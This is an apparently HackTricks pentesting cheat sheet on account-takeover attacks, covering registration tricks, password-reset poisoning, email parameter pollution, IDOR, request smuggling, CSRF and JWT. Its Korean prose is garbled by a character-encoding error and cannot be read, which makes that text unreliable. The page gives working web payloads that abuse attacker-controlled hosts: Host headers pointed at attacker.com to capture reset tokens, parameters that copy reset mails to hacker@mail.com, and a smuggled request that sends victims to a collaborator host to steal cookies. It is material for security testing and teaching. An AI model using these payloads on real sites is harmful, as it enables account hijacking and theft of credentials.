# ë“±ë¡ ë° ì¸ìˆ˜ ì·¨ì•½ì 

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}


## ë“±ë¡ ì¸ìˆ˜

### ì¤‘ë³µ ë“±ë¡

* ê¸°ì¡´ ì‚¬ìš©ì ì´ë¦„ì„ ì‚¬ìš©í•˜ì—¬ ìƒì„±í•´ ë³´ì„¸ìš”.
* ì´ë©”ì¼ì„ ë‹¤ì–‘í•˜ê²Œ ë³€ê²½í•´ ë³´ì„¸ìš”:
* ëŒ€ë¬¸ì
* \+1@
* ì´ë©”ì¼ì— ì  ì¶”ê°€
* ì´ë©”ì¼ ì´ë¦„ì— íŠ¹ìˆ˜ ë¬¸ì (%00, %09, %20)
* ì´ë©”ì¼ ë’¤ì— ê²€ì€ ë¬¸ì ì¶”ê°€: `test@test.com a`
* victim@gmail.com@attacker.com
* victim@attacker.com@gmail.com

### ì‚¬ìš©ì ì´ë¦„ ì—´ê±°

ì• í”Œë¦¬ì¼€ì´ì…˜ ë‚´ì—ì„œ ì‚¬ìš©ì ì´ë¦„ì´ ì´ë¯¸ ë“±ë¡ë˜ì—ˆëŠ”ì§€ í™•ì¸í•´ ë³´ì„¸ìš”.

### ë¹„ë°€ë²ˆí˜¸ ì •ì±…

ì‚¬ìš©ìë¥¼ ìƒì„±í•  ë•Œ ë¹„ë°€ë²ˆí˜¸ ì •ì±…ì„ í™•ì¸í•˜ì„¸ìš” (ì•½í•œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì¸).\
ì´ ê²½ìš° ìê²© ì¦ëª…ì„ ë¬´ì°¨ë³„ ëŒ€ì…í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### SQL ì¸ì ì…˜

[**ì´ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì„¸ìš”**](sql-injection/#insert-statement) ê³„ì • ì¸ìˆ˜ ë˜ëŠ” **SQL ì¸ì ì…˜**ì„ í†µí•´ ì •ë³´ë¥¼ ì¶”ì¶œí•˜ëŠ” ë°©ë²•ì„ ë°°ìš°ì„¸ìš”.

### Oauth ì¸ìˆ˜

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### SAML ì·¨ì•½ì 

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### ì´ë©”ì¼ ë³€ê²½

ë“±ë¡ í›„ ì´ë©”ì¼ì„ ë³€ê²½í•´ ë³´ê³  ì´ ë³€ê²½ì´ ì˜¬ë°”ë¥´ê²Œ ê²€ì¦ë˜ëŠ”ì§€ ë˜ëŠ” ì„ì˜ì˜ ì´ë©”ì¼ë¡œ ë³€ê²½í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”.

### ì¶”ê°€ í™•ì¸ ì‚¬í•­

* **ì¼íšŒìš© ì´ë©”ì¼** ì‚¬ìš© ê°€ëŠ¥ ì—¬ë¶€ í™•ì¸
* **ê¸´** **ë¹„ë°€ë²ˆí˜¸** (>200)ëŠ” **DoS**ë¡œ ì´ì–´ì§
* **ê³„ì • ìƒì„±ì— ëŒ€í•œ ë¹„ìœ¨ ì œí•œ í™•ì¸**
* username@**burp\_collab**.netì„ ì‚¬ìš©í•˜ê³  **ì½œë°±**ì„ ë¶„ì„í•˜ì„¸ìš”.

## **ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • ì¸ìˆ˜**

### ì°¸ì¡°ìë¥¼ í†µí•œ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • í† í° ìœ ì¶œ <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì •ì„ ìœ„í•´ ì´ë©”ì¼ ì£¼ì†Œë¡œ ìš”ì²­í•˜ì„¸ìš”.
2. ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • ë§í¬ë¥¼ í´ë¦­í•˜ì„¸ìš”.
3. ë¹„ë°€ë²ˆí˜¸ë¥¼ ë³€ê²½í•˜ì§€ ë§ˆì„¸ìš”.
4. 3ì ì›¹ì‚¬ì´íŠ¸(ì˜ˆ: Facebook, Twitter)ë¥¼ í´ë¦­í•˜ì„¸ìš”.
5. Burp Suite í”„ë¡ì‹œì—ì„œ ìš”ì²­ì„ ê°€ë¡œì±„ì„¸ìš”.
6. referer í—¤ë”ê°€ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • í† í°ì„ ìœ ì¶œí•˜ëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”.

### ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • ì¤‘ë… <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Burp Suiteì—ì„œ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • ìš”ì²­ì„ ê°€ë¡œì±„ì„¸ìš”.
2. Burp Suiteì—ì„œ ë‹¤ìŒ í—¤ë”ë¥¼ ì¶”ê°€í•˜ê±°ë‚˜ ìˆ˜ì •í•˜ì„¸ìš”: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. ìˆ˜ì •ëœ í—¤ë”ë¡œ ìš”ì²­ì„ ì „ë‹¬í•˜ì„¸ìš”.\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. _host í—¤ë”_ë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•œ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • URLì„ ì°¾ìœ¼ì„¸ìš”: `https://attacker.com/reset-password.php?token=TOKEN`

### ì´ë©”ì¼ ë§¤ê°œë³€ìˆ˜ë¥¼ í†µí•œ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. ê³µê²©ìëŠ” ìì‹ ì˜ ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸í•˜ê³  **ë¹„ë°€ë²ˆí˜¸ ë³€ê²½** ê¸°ëŠ¥ìœ¼ë¡œ ì´ë™í•´ì•¼ í•©ë‹ˆë‹¤.
2. Burp Suiteë¥¼ ì‹œì‘í•˜ê³  ìš”ì²­ì„ ê°€ë¡œì±•ë‹ˆë‹¤.
3. ë°˜ë³µê¸° íƒ­ìœ¼ë¡œ ë³´ë‚´ê³  ë§¤ê°œë³€ìˆ˜ë¥¼ í¸ì§‘í•©ë‹ˆë‹¤: ì‚¬ìš©ì ID/ì´ë©”ì¼\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • í† í°ì€ ë§¤ë²ˆ ë¬´ì‘ìœ„ë¡œ ìƒì„±ë˜ê³  ê³ ìœ í•´ì•¼ í•©ë‹ˆë‹¤.\
í† í°ì´ ë§Œë£Œë˜ëŠ”ì§€ ë˜ëŠ” í•­ìƒ ë™ì¼í•œì§€ í™•ì¸í•˜ì‹­ì‹œì˜¤. ê²½ìš°ì— ë”°ë¼ ìƒì„± ì•Œê³ ë¦¬ì¦˜ì´ ì•½í•˜ê³  ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ë³€ìˆ˜ë“¤ì´ ì•Œê³ ë¦¬ì¦˜ì— ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* íƒ€ì„ìŠ¤íƒ¬í”„
* ì‚¬ìš©ì ID
* ì‚¬ìš©ì ì´ë©”ì¼
* ì´ë¦„ê³¼ ì„±
* ìƒë…„ì›”ì¼
* ì•”í˜¸í™”
* ìˆ«ìë§Œ
* ì‘ì€ í† í° ì‹œí€€ìŠ¤ (ë¬¸ì \[A-Z,a-z,0-9] ì‚¬ì´)
* í† í° ì¬ì‚¬ìš©
* í† í° ë§Œë£Œ ë‚ ì§œ

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. íŠ¹ì • ì´ë©”ì¼ì„ ì‚¬ìš©í•˜ì—¬ API/UIë¥¼ í†µí•´ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • ìš”ì²­ì„ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤. ì˜ˆ: test@mail.com
2. ì„œë²„ ì‘ë‹µì„ ê²€ì‚¬í•˜ê³  `resetToken`ì„ í™•ì¸í•©ë‹ˆë‹¤.
3. ê·¸ëŸ° ë‹¤ìŒ URLì—ì„œ í† í°ì„ ì‚¬ìš©í•©ë‹ˆë‹¤: `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. í”¼í•´ìì˜ ì‚¬ìš©ì ì´ë¦„ê³¼ ë™ì¼í•œ ì‚¬ìš©ì ì´ë¦„ìœ¼ë¡œ ì‹œìŠ¤í…œì— ë“±ë¡í•˜ë˜, ì‚¬ìš©ì ì´ë¦„ ì•ë’¤ì— ê³µë°±ì„ ì‚½ì…í•©ë‹ˆë‹¤. ì˜ˆ: `"admin "`
2. ì•…ì˜ì ì¸ ì‚¬ìš©ì ì´ë¦„ìœ¼ë¡œ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì •ì„ ìš”ì²­í•©ë‹ˆë‹¤.
3. ì´ë©”ì¼ë¡œ ì „ì†¡ëœ í† í°ì„ ì‚¬ìš©í•˜ì—¬ í”¼í•´ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¬ì„¤ì •í•©ë‹ˆë‹¤.
4. ìƒˆ ë¹„ë°€ë²ˆí˜¸ë¡œ í”¼í•´ì ê³„ì •ì— ì—°ê²°í•©ë‹ˆë‹¤.

í”Œë«í¼ CTFdëŠ” ì´ ê³µê²©ì— ì·¨ì•½í–ˆìŠµë‹ˆë‹¤.\
ì°¸ì¡°: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. ì• í”Œë¦¬ì¼€ì´ì…˜ ë‚´ì—ì„œ XSSë¥¼ ì°¾ê±°ë‚˜ ì¿ í‚¤ê°€ ë¶€ëª¨ ë„ë©”ì¸ì— ë²”ìœ„ê°€ ì§€ì •ëœ ê²½ìš° ì„œë¸Œë„ë©”ì¸ì—ì„œ ì°¾ìŠµë‹ˆë‹¤: `*.domain.com`
2. í˜„ì¬ **ì„¸ì…˜ ì¿ í‚¤**ë¥¼ ìœ ì¶œí•©ë‹ˆë‹¤.
3. ì¿ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ìë¡œ ì¸ì¦í•©ë‹ˆë‹¤.

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. **smuggler**ë¥¼ ì‚¬ìš©í•˜ì—¬ HTTP ìš”ì²­ ë°€ë°˜ì… ìœ í˜•ì„ ê°ì§€í•©ë‹ˆë‹¤ (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. ë‹¤ìŒ ë°ì´í„°ë¥¼ ì‚¬ìš©í•˜ì—¬ `POST / HTTP/1.1`ë¥¼ ë®ì–´ì“¸ ìš”ì²­ì„ ì‘ì„±í•©ë‹ˆë‹¤:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` í”¼í•´ìë¥¼ burpcollabë¡œ ë¦¬ë””ë ‰ì…˜í•˜ê³  ì¿ í‚¤ë¥¼ í›”ì¹˜ëŠ” ê²ƒì´ ëª©í‘œì…ë‹ˆë‹¤.\
3\. ìµœì¢… ìš”ì²­ì€ ë‹¤ìŒê³¼ ê°™ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone ë³´ê³ ì„œì—ì„œ ì´ ë²„ê·¸ë¥¼ ì•…ìš©í•œ ì‚¬ë¡€\
\* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
\* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### CSRFë¥¼ í†µí•œ ê³„ì • íƒˆì·¨ <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. CSRFë¥¼ ìœ„í•œ í˜ì´ë¡œë“œ ìƒì„±, ì˜ˆ: â€œë¹„ë°€ë²ˆí˜¸ ë³€ê²½ì„ ìœ„í•œ ìë™ ì œì¶œ HTML ì–‘ì‹â€
2. í˜ì´ë¡œë“œ ì „ì†¡

### JWTë¥¼ í†µí•œ ê³„ì • íƒˆì·¨ <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON ì›¹ í† í°ì€ ì‚¬ìš©ìë¥¼ ì¸ì¦í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* ë‹¤ë¥¸ ì‚¬ìš©ì ID / ì´ë©”ì¼ë¡œ JWT ìˆ˜ì •
* ì•½í•œ JWT ì„œëª… í™•ì¸

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## ì°¸ê³  ë¬¸í—Œ

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)


{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
